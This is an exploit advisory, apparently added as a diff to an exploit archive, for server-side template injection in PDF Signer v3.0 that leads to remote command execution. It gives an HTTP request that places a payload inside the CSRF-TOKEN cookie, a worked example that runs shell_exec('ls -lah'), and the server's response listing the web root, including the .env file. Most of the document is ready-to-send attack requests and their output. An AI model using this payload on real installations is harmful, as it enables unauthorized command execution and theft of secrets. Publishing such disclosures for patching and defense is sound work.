@@ -1,0 +1,70 @@
+# Exploit Title: PDF Signer v3.0 - SSTI to RCE via CSRF Cookie
+# Dork: N/A
+# Date: 2019-01-28
+# Exploit Author: dd_ (info@malicious.group)
+# Vendor Homepage: https://codecanyon.net/user/simcy_creative
+# Software Link: https://codecanyon.net/item/signer-create-digital-signatures-and-sign-pdf-documents-online/20737707
+# Version: v3.0
+# Tested on: PHP/MySQL (PHP 7.2 / MySQL 5.7.25-0ubuntu0.18.04.2-log)
+# Vendor Banner: Signer v3.0 – Create Digital signatures and Sign PDF documents
+# Research IRC: irc.blackcatz.org #blackcatz
+
+# Vulnerability: Server-Side Template Injection leading to Remote Command Execution due to improper Cookie handling and improper CSRF implementation.
+
+# POC:
+# 1)
+
+GET / HTTP/1.1
+Host: signer.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://signer.local/signin/?secure=true
+Connection: close
+Cookie: CSRF-TOKEN=rnqvt{{[PHP_COMMAND_HERE]}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
+Upgrade-Insecure-Requests: 1
+
+# Example
+
+[REQUEST]
+
+GET / HTTP/1.1
+Host: signer.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://signer.local/signin/?secure=true
+Connection: close
+Cookie: CSRF-TOKEN=rnqvt{{shell_exec('ls -lah')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl
+Upgrade-Insecure-Requests: 1
+
+[RESPONSE]
+
+--half way down page---snip--
+
+<label>Folder name</label>
+<input type="text" class="form-control" name="foldername" placeholder="Folder name" data-parsley-required="true">
+<input type="hidden" name="folder" value="1">
+<input type="hidden" name="folderid">
+<input type="hidden" name="csrf-token" value="rnqvttotal 112K
+drwxr-xr-x  9 www-data www-data 4.0K Jan 28 12:04 .
+drwxr-xr-x  6 www-data www-data 4.0K Jan 28 06:19 ..
+-rw-r--r--  1 www-data www-data 1.1K Jan 28 12:03 .env
+-rw-r--r--  1 www-data www-data  532 Jan  9 20:52 .htaccess
+drwxr-xr-x  9 www-data www-data 4.0K Jan  9 20:53 assets
+-rw-r--r--  1 www-data www-data  947 Jan  9 20:52 composer.json
+-rw-r--r--  1 www-data www-data  54K Jan  9 20:52 composer.lock
+drwxr-xr-x  2 www-data www-data 4.0K Jan 28 11:59 config
+-rw-r--r--  1 www-data www-data 1.7K Jan  9 20:52 cron.php
+-rw-r--r--  1 www-data www-data  169 Jan  9 20:52 index.php
+drwxr-xr-x  3 www-data www-data 4.0K Jan  9 20:53 lang
+drwxr-xr-x  6 www-data www-data 4.0K Jan 28 11:46 src
+drwxr-xr-x  9 www-data www-data 4.0K Jan  9 20:53 uploads
+drwxr-xr-x 24 www-data www-data 4.0K Jan  9 20:53 vendor
+drwxr-xr-x  6 www-data www-data 4.0K Jan  9 20:53 views
+to5gw" />
+</div>
+</div>
+</div>
+
+--- snip ---
